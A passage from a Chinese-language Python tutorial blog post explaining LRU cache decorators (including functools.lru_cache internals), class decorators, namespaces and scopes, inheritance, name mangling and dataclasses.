<span class="hljs-keyword">def</span> <span class="hljs-title function_">make_key</span>(<span class="hljs-params">args, func</span>):
    <span class="hljs-comment"># 如果函数是空参，可以使用函数名作为key</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) == <span class="hljs-number">0</span>:
        module_obj = inspect.getmodule(func)
        module_file_path = module_obj.__file__
        module_func_key = module_file_path + <span class="hljs-string">"."</span> + func.__name__

        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(module_func_key)

    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(args)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_lru_cache</span>(<span class="hljs-params">maxsize=<span class="hljs-number">128</span></span>):  <span class="hljs-comment"># 定义该装饰器接收的参数，表示当前这个内存中允许使用的最大缓存数量</span>
    <span class="hljs-comment"># 如果第一个参数是函数，说明是不带括号的用法</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">callable</span>(maxsize):  <span class="hljs-comment"># 这个行为是为了避免用户使用 @simple_lru_cache 方式进行调用</span>
        func = maxsize
        maxsize = <span class="hljs-number">128</span>
        <span class="hljs-comment"># 直接返回装饰后的函数</span>
        <span class="hljs-keyword">return</span> simple_lru_cache()(func)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorator</span>(<span class="hljs-params">func</span>):
        <span class="hljs-string">"""简化版 LRU 缓存（仅支持位置参数）"""</span>
        cache = {}  <span class="hljs-comment"># 缓存的字典</span>
        order = []  <span class="hljs-comment"># 访问的顺序列表</span>

<span class="hljs-meta">        @functools.wraps(<span class="hljs-params">func</span>)</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args</span>):
            <span class="hljs-comment"># 判断传递的这个参数之前有没有调用过</span>
            <span class="hljs-keyword">if</span> make_key(args, func) <span class="hljs-keyword">in</span> cache:
                order.remove(args)
                order.insert(<span class="hljs-number">0</span>, args)  <span class="hljs-comment"># 在头部插入该参数，来实现缓存更新，表示最新使用过了这个数据</span>
                <span class="hljs-keyword">return</span> cache[make_key(args, func)]  <span class="hljs-comment"># 缓存命中</span>

            <span class="hljs-comment"># 之前没有缓存过数据</span>
            result = func(*args)
            cache[make_key(args, func)] = result
            order.insert(<span class="hljs-number">0</span>, args)

            <span class="hljs-comment"># 缓存满了，删除最旧的</span>
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(order) &gt; maxsize:
                oldest = order.pop(<span class="hljs-built_in">len</span>(order) - <span class="hljs-number">1</span>)
                <span class="hljs-keyword">del</span> cache[oldest]

            <span class="hljs-keyword">return</span> result

        <span class="hljs-keyword">return</span> wrapper

    <span class="hljs-keyword">return</span> decorator


<span class="hljs-meta">@simple_lru_cache</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"foo"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>


<span class="hljs-meta">@simple_lru_cache</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"bar"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>


foo()
foo()
bar()
bar()
</code></pre>
<pre><code class="hljs language-python" lang="python">foo
bar
</code></pre>
<h5 data-id="heading-18">探究</h5>
<p>functools.lru_cache 的具体实现。</p>
<ol>
<li>lru_cache 装饰器入口</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">lru_cache</span>(<span class="hljs-params">maxsize=<span class="hljs-number">128</span>, typed=<span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""LRU 缓存装饰器

    参数:
        maxsize: 最大缓存大小，None 表示无限制
        typed: True 时，不同类型的参数会分别缓存（如 3 和 3.0）
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(maxsize, <span class="hljs-built_in">int</span>):
        <span class="hljs-keyword">if</span> maxsize &lt; <span class="hljs-number">0</span>:
            maxsize = <span class="hljs-number">0</span>

    <span class="hljs-comment"># @lru_cache (不带括号，直接装饰函数，此时maxsize本质上是我们被装饰的函数对象)</span>
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">callable</span>(maxsize) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(typed, <span class="hljs-built_in">bool</span>):
        user_function = maxsize
        maxsize = <span class="hljs-number">128</span>
        <span class="hljs-comment"># 获取装饰器函数，后续真正执行的是该函数</span>
        wrapper = _lru_cache_wrapper(user_function, maxsize, typed, _CacheInfo)
        wrapper.cache_parameters = <span class="hljs-keyword">lambda</span> : {<span class="hljs-string">'maxsize'</span>: maxsize, <span class="hljs-string">'typed'</span>: typed}
        <span class="hljs-comment"># 更新user_function的元信息，避免因为装饰丢失元信息</span>
        <span class="hljs-keyword">return</span> update_wrapper(wrapper, user_function)

    <span class="hljs-comment"># maxsize 参数错误</span>
    <span class="hljs-keyword">elif</span> maxsize <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">'Expected first argument to be an integer, a callable, or None'</span>)

    <span class="hljs-comment"># 装饰器工厂，常规使用 即 @lru_cache() 的方式</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decorating_function</span>(<span class="hljs-params">user_function</span>):
        wrapper = _lru_cache_wrapper(user_function, maxsize, typed, _CacheInfo)
        wrapper.cache_parameters = <span class="hljs-keyword">lambda</span> : {<span class="hljs-string">'maxsize'</span>: maxsize, <span class="hljs-string">'typed'</span>: typed}
        <span class="hljs-keyword">return</span> update_wrapper(wrapper, user_function)

    <span class="hljs-keyword">return</span> decorating_function
</code></pre>
<p>我们可以重点关注一下  情况2 <code>@lru_cache</code>这种调用，基本覆盖所有的 lru_cache 的场景。</p>
<p>当这样装饰函数之后，被装饰的函数 <code>wrapped / user_function</code>就变成了 <code>update_wrapper()</code>返回结果，后续的调用，基本都是在调用 <code>wrapper</code>该函数</p>
<p>lru_cache 的重点也就是该<code>wrapper</code>函数，即 <code>_lru_cache_wrapper</code></p>
<p>我们这里只关注 maxsize &gt; 0 的状态</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_lru_cache_wrapper</span>(<span class="hljs-params">user_function, maxsize, typed, _CacheInfo</span>):
    sentinel = <span class="hljs-built_in">object</span>()          <span class="hljs-comment"># unique object used to signal cache misses</span>
    make_key = _make_key         <span class="hljs-comment"># build a key from the function arguments</span>
    PREV, NEXT, KEY, RESULT = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>   <span class="hljs-comment"># 通过数组的形式完成链表，这里四个元素将构建链表的一个节点的所有属性</span>

    cache = {}  <span class="hljs-comment"># 该函数维护的所有缓存字典, 类型为 dict[str, (PREV, NEXT, KEY, RESULT)]</span>
    hits = misses = <span class="hljs-number">0</span>
    full = <span class="hljs-literal">False</span>
    cache_get = cache.get    <span class="hljs-comment"># 从字典中获取数据的方法</span>
    cache_len = cache.__len__  <span class="hljs-comment"># get cache size without calling len()</span>
    lock = RLock()           <span class="hljs-comment"># 通过加锁来避免多线程情况下的数据竞争问题</span>
    root = []                <span class="hljs-comment"># root of the circular doubly linked list</span>
    root[:] = [root, root, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]     <span class="hljs-comment"># 初始化链表，</span>

    ...

    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwds</span>):
            <span class="hljs-comment"># Size limited caching that tracks accesses by recency</span>
            <span class="hljs-keyword">nonlocal</span> root, hits, misses, full
            key = make_key(args, kwds, typed)  <span class="hljs-comment"># 生成缓存键</span>
            <span class="hljs-keyword">with</span> lock:  <span class="hljs-comment"># 加锁，来保证线程安全</span>
                link = cache_get(key)  <span class="hljs-comment"># 从缓存中尝试获取数据，如果key不存在，返回None</span>
                <span class="hljs-keyword">if</span> link <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 缓存命中</span>
                    <span class="hljs-comment"># 接下来的操作将命中的缓存从最后位置移动到最先的位置</span>
                    link_prev, link_next, _key, result = link
                    link_prev[NEXT] = link_next
                    link_next[PREV] = link_prev
                    last = root[PREV]
                    last[NEXT] = root[PREV] = link
                    link[PREV] = last
                    link[NEXT] = root
                    hits += <span class="hljs-number">1</span>
                    <span class="hljs-keyword">return</span> result
                misses += <span class="hljs-number">1</span>
            result = user_function(*args, **kwds)
            <span class="hljs-keyword">with</span> lock:
                <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> cache:
                    <span class="hljs-keyword">pass</span>
                <span class="hljs-keyword">elif</span> full:
                    oldroot = root
                    oldroot[KEY] = key
                    oldroot[RESULT] = result
                    root = oldroot[NEXT]
                    oldkey = root[KEY]
                    oldresult = root[RESULT]
                    root[KEY] = root[RESULT] = <span class="hljs-literal">None</span>
                    <span class="hljs-keyword">del</span> cache[oldkey]
                    cache[key] = oldroot
                <span class="hljs-keyword">else</span>:
                    last = root[PREV]
                    link = [last, root, key, result]
                    last[NEXT] = root[PREV] = cache[key] = link
                    full = (cache_len() &gt;= maxsize)
            <span class="hljs-keyword">return</span> result
</code></pre>
<p>这里的切换流程</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7afa5d5c391415ebbe673e941c9d4f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=ejjBYt4ofMvFM7c1WhvrEPoVxZU%3D" alt="" loading="lazy"/></p>
<p>这个类还提供了 2 个辅助方法</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cache_info</span>():
    <span class="hljs-string">"""报告缓存统计信息"""</span>
    <span class="hljs-keyword">with</span> lock:
        <span class="hljs-keyword">return</span> _CacheInfo(hits, misses, maxsize, cache_len())

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cache_clear</span>():
    <span class="hljs-string">"""清空缓存和统计"""</span>
    <span class="hljs-keyword">nonlocal</span> hits, misses, full
    <span class="hljs-keyword">with</span> lock:
        cache.clear()
        root[:] = [root, root, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]
        hits = misses = <span class="hljs-number">0</span>
        full = <span class="hljs-literal">False</span>
</code></pre>
<p>所以再开始我们对单例进行 shutdown 的时候，总会调用 lru_cache 装饰的函数的 <code>cache_clear</code>来清空内存信息</p>
<h3 data-id="heading-19">类装饰器</h3>
<p>其实这里说的类装饰器，本质上还是函数，只不过 python 的语法灵活，可以把类看成函数，其次借用 <code>@</code>这个语法糖</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CountCalls</span>:
    <span class="hljs-string">"""统计函数调用次数的类装饰器"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, func</span>):
        functools.update_wrapper(self, func)
        self.func = func
        self.count = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        self.count += <span class="hljs-number">1</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"调用次数: <span class="hljs-subst">{self.count}</span>"</span>)
        <span class="hljs-keyword">return</span> self.func(*args, **kwargs)

<span class="hljs-meta">@CountCalls</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Hello, <span class="hljs-subst">{name}</span>!"</span>)

greet(<span class="hljs-string">"Alice"</span>)  <span class="hljs-comment"># 调用次数: 1</span>
greet(<span class="hljs-string">"Bob"</span>)    <span class="hljs-comment"># 调用次数: 2</span>
</code></pre>
<p>他这里就相当于初始化一个类对象，然后调用类的 <code>__call__</code>方法，但是要注意 func 在 <code>__init__</code>中传递的。</p>
<h2 data-id="heading-20">Class</h2>
<h3 data-id="heading-21">namespace 命名空间</h3>
<p>和模块一样, 类也支持 Python 动态特性: 在运行时创建, 创建后还可以修改</p>
<p>Python 的类也是对象, 这为导入和重命名提供了语义支持, 以及类型编程提供了可行</p>
<p>对象之间相互独立, 多个名称(甚至是多个作用域内的多个名称)可以绑定到同一对象</p>
<p>一定要注意 name 和 具体的数据对象他们是存在不同的. name使我们给这个数据对象起的一个标识而已</p>
<p>namespace: <strong>是从名称到对象的映射</strong>.</p>
<p>现在, 大多数命名空间都使用 Python 的dict实现, 所以他可以简单的理解为就是一个通过dict实现的name和对象之间的关系对象.</p>
<p>但除非涉及到性能优化, 我们一般不会关注这方面的事情, 而且将来也可能会改变这种方式</p>
<p>关于namespace的具体示例有:</p>
<ol>
<li>内置名称的集合(例如abs()函数, 还有异常等)</li>
<li>一个模块(.py文件)的全局名称</li>
<li>函数调用中的局部名称</li>
</ol>
<p>为何要强调 namespace 的说明, 因为 <strong>不同命名空间中的名称之间绝对没有关系</strong></p>
<p>例如, 两个不同的模块(.py文件)都可以定义 maximize 函数, 且不会造成混淆. 用户使用函数时必须要在函数名前面加上模块名</p>
<p>内置名称的命名空间是在 Python 解释器启动时创建的, 永远不会被删除.</p>
<p>模块的全局命名空间(也就是模块中全局name与对象之间的关系)在读取模块定义时创建; 通常, 模块的命名空间也会持续到解释器退出</p>
<h3 data-id="heading-22">Scopes 作用域</h3>
<p>一个命名空间的 作用域 是 Python 代码中的一段文本区域, <strong>从这个区域可直接访问该命名空间.</strong></p>
<p>通俗理解就是, 我们在这个区域可以直接访问变量 / 函数 等这些name, 找到他们对应的对象(值 / 调用函数)</p>
<p>作用域虽然是被静态确定的, 但会被动态使用</p>
<ol>
<li>最内层作用域, 包含局部名称, 并首先在其中进行搜索</li>
<li>那些外层闭包函数的作用域, 包含 "非局部、非全局" 的名称, 从最靠内层的那个作用域开始, 逐层向外搜索</li>
<li>倒数第二层作用域, 包含当前模块的全局名称</li>
<li>最外层(最后搜索)的作用域, 是内置名称的命名空间</li>
</ol>
<p>而内置名称的namespace在<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.13%2Flibrary%2Fbuiltins.html%23module-builtins" target="_blank" title="https://docs.python.org/zh-cn/3.13/library/builtins.html#module-builtins" ref="nofollow noopener noreferrer">builtins</a>模块下, 例如在该namespace下, 我们有 False, True, None</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
Module: quickstart.py
Description: 类的初识
Author: Falling Snow
Date: 2025-06-06
"""</span>

<span class="hljs-comment"># -*- coding: utf-8 -*-</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">scopes_global_nonlocal_test</span>():
    <span class="hljs-string">"""global nonlocal 变量测试"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_local</span>():
        spam = <span class="hljs-string">"local spam"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_nonlocal</span>():
        <span class="hljs-comment"># 使用 nonlocal 需要在当前def的scope外部创建一个spam</span>
        <span class="hljs-keyword">nonlocal</span> spam
        spam = <span class="hljs-string">"nonlocal spam"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_global</span>():
        <span class="hljs-keyword">global</span> spam
        spam = <span class="hljs-string">"global spam"</span>

    spam = <span class="hljs-string">"test spam"</span>
    do_local()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"After local assignment:"</span>, spam)
    do_nonlocal()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"After nonlocal assignment:"</span>, spam)
    do_global()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"After global assignment:"</span>, spam)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    scopes_global_nonlocal_test()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"In global scope: "</span>, spam)

</code></pre>

<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20class/global_nonlocal_var_step.png" alt="转存失败，建议直接上传图片文件" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa7739fb3d5142f89514f2e79d1f7f85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=oxPxNYKmuEZE8dh2jI1Zzh0cRME%3D" alt="" loading="lazy"/></p>
<p>:::info
nonlocal的赋值会改变我们的对于变量的绑定, 而global会修改模块层级的绑定</p>
<p>nonlocal会想当前作用域的外部进行寻找, 而global会在全局作用域中处理</p>
<p>:::</p>
<h3 data-id="heading-23">class</h3>
<p>当进入类定义时, 将创建一个新的命名空间, 并将其用作局部作用域 --- 因此, 所有对局部变量的赋值都是在这个新命名空间之内</p>
<p>如果不支持继承, 语言特性就不值得称为"类". 派生类定义的语法如下所示</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DerivedClassName</span>(<span class="hljs-title class_ inherited__">BaseClassName</span>):
    &lt;语句-<span class="hljs-number">1</span>&gt;
    .
    .
    .
    &lt;语句-N&gt;
</code></pre>
<h4 data-id="heading-24">元类</h4>
<p>类它也是一个对象, 他们有这样的关系</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/363c12d4dc264ac4bde11bc60c830838~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=2BPllBNYnS80UJruE%2FCi9iPTtUM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-25">isinstance &amp; issubclass</h4>
<p>Python有两个内置函数可被用于继承机制:</p>
<ul>
<li>使用<code>isinstance()</code>来检查一个<strong>实例的类型</strong>: <code>isinstance(obj, int)</code>仅会在<code>obj.__class__</code> 为 int 或派生于 int 的类时为True</li>
<li>使用<code>issubclass()</code> 来检查<strong>类的继承关系</strong>: <code>issubclass(bool, int)</code>为True, 因为bool是int的子类, 但是<code>issubclass(float, int)</code> 为 <code>False</code>, 因为 <code>float</code> 不是 <code>int</code> 的子类</li>
</ul>
<p>补充一下<code>obj.__class__</code>的概念:</p>
<p>python中每一个值都是一个对象, 而对于实例而言, 他们会保存其类型信息, 通过<code>obj.__class__</code> 进行存储</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():
    <span class="hljs-keyword">pass</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    i = <span class="hljs-number">233</span>
    <span class="hljs-built_in">print</span>(i.__class__)  <span class="hljs-comment"># &lt;class 'int'&gt;</span>

    <span class="hljs-built_in">print</span>(A().__class__)  <span class="hljs-comment"># &lt;class '__main__.A'&gt;</span>
</code></pre>
<h4 data-id="heading-26">多继承</h4>
<p>如果多继承了, 我们访问同名属性, 他会调用谁的呢?</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DerivedClassName</span>(Base1, Base2, Base3):
    <span class="hljs-keyword">pass</span>
</code></pre>
<p>从父类所继承属性的操作是深度优先、从左到右的, 当层次结构存在重叠时不会在同一个类中搜索两次. 因此, 如果某个属性在 <code>DerivedClassName</code> 中找不到, 就会在 <code>Base1</code> 中搜索它, 然后（递归地）在 <code>Base1</code> 的基类中搜索, 如果在那里也找不到, 就将在 <code>Base2</code> 中搜索, 依此类推</p>
<h4 data-id="heading-27">private</h4>
<p><strong>那种仅限从一个对象内部访问的"私有"实例变量在 Python 中并不存在</strong></p>
<p>但是, 大多数 Python 代码都遵循这样一个约定: 带有一个下划线的名称 (例如 <code>_spam</code>) 应该被当作是 API 的非公有部分 (无论它是函数、方法或是数据成员)</p>
<p>但这种行为终究只是约定, 如果我们真的希望使用一些私有的成员,  python提供了一种较为脆弱的机制: <code>name mangling</code> 对的, 就像是c++中函数重载的机制一样, python<strong>会对双下划线的成员进行name mangling</strong>, 例如<code>__spam</code> 会被改为 <code>_classname__spam</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mapping</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, iterable</span>):
        self.items_list = []
        self.__update(iterable)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, iterable</span>):
        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterable:
            self.items_list.append(item)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self, index</span>):
        <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(self.items_list):
            <span class="hljs-keyword">raise</span> StopIteration
        <span class="hljs-keyword">return</span> self.items_list[index]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">iter</span>(self.items_list)

    __update = update  <span class="hljs-comment"># update 的副本, 但是该方法是私有的</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">MappingSubclass</span>(<span class="hljs-title class_ inherited__">Mapping</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, keys, values</span>):  <span class="hljs-comment"># 不会破坏Mapping的__init__中self.__update(iterable)这个逻辑, 还提供了update新的签名</span>
        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(keys, values):
            self.items_list.append(item)  <span class="hljs-comment"># item is a Tuple(key, value)</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    ms = MappingSubclass([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
    <span class="hljs-built_in">print</span>(<span class="hljs-string">', '</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ms))
    ms.update([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-string">'alice'</span>, <span class="hljs-string">'bob'</span>, <span class="hljs-string">'jude'</span>])
    <span class="hljs-built_in">print</span>(<span class="hljs-string">', '</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ms))

    ms.__update([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])  <span class="hljs-comment"># AttributeError: 'MappingSubclass' object has no attribute '__update'. Did you mean: 'update'?</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">', '</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ms))
</code></pre>
<h4 data-id="heading-28">odds and ends(杂项)</h4>
<ul>
<li>数据类</li>
</ul>
<p>快速使用</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>:
    name: <span class="hljs-built_in">str</span>
    dept: <span class="hljs-built_in">str</span>
    salary: <span class="hljs-built_in">int</span>
</code></pre>
<p>当我们给类添加了<code>@dataclass</code>装饰器, 它用于自动为我们自定义的类添加生成一些 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.13%2Fglossary.html%23term-special-method" target="_blank" title="https://docs.python.org/zh-cn/3.13/glossary.html#term-special-method" ref="nofollow noopener noreferrer">特殊方法</a> 例如 <code>__init__()</code> 和 <code>__repr__()</code>。 它的初始描述见 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0557%2F" target="_blank" title="https://peps.python.org/pep-0557/" ref="nofollow noopener noreferrer"><strong>PEP 557</strong></a></p>
<p>他们具有如下的转换关系</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass

<span class="hljs-meta">@dataclass</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">InventoryItem</span>:
    <span class="hljs-string">'''Class for keeping track of an item in inventory.'''</span>
    name: <span class="hljs-built_in">str</span>
    unit_price: <span class="hljs-built_in">float</span>
    quantity_on_hand: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">total_cost</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">float</span>:
        <span class="hljs-keyword">return</span> self.unit_price * self.quantity_on_hand
</code></pre>
<p><code>@dataclass</code>装饰器将向类添加这些内容</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, unit_price: <span class="hljs-built_in">float</span>, quantity_on_hand: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>) -&gt; <span class="hljs-literal">None</span>:
    self.name = name
    self.unit_price = unit_price
    self.quantity_on_hand = quantity_on_hand
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
    <span class="hljs-comment"># &lt;expression&gt;!r 等同于 repr(&lt;expression&gt;)</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f'InventoryItem(name=<span class="hljs-subst">{self.name!r}</span>, unit_price=<span class="hljs-subst">{self.unit_price!r}</span>, quantity_on_hand=<span class="hljs-subst">{self.quantity_on_hand!r}</span>)'</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) == (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__ne__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) != (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__lt__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) &lt; (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__le__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) &lt;= (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__gt__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) &gt; (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">__ge__</span>(<span class="hljs-params">self, other</span>):
    <span class="hljs-keyword">if</span> other.__class__ <span class="hljs-keyword">is</span> self.__class__:
        <span class="hljs-keyword">return</span> (self.name, self.unit_price, self.quantity_on_hand) &gt;= (other.name, other.unit_price, other.quantity_on_hand)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NotImplemented</span>
</code></pre>
<p>也就是我们基础的 <code>__init__</code>, <code>__repr__</code>, Rich_Comparsion method, 当然, 它允许我们重写一些方法</p>
<p>从这里, 我们也可以看出, 一般<code>__repr__</code>用于展示我们的这个实例的结构</p>
<h2 data-id="heading-29">Generator(生成器)</h2>
<p>概述: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.13%2Ftutorial%2Fclasses.html%23generators" target="_blank" title="https://docs.python.org/zh-cn/3.13/tutorial/classes.html#generators" ref="nofollow noopener noreferrer">docs.python.org/zh-cn/3.13/…</a></p>
<p>具体: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.13%2Fglossary.html%23term-generator" target="_blank" title="https://docs.python.org/zh-cn/3.13/glossary.html#term-generator" ref="nofollow noopener noreferrer">docs.python.org/zh-cn/3.13/…</a></p>
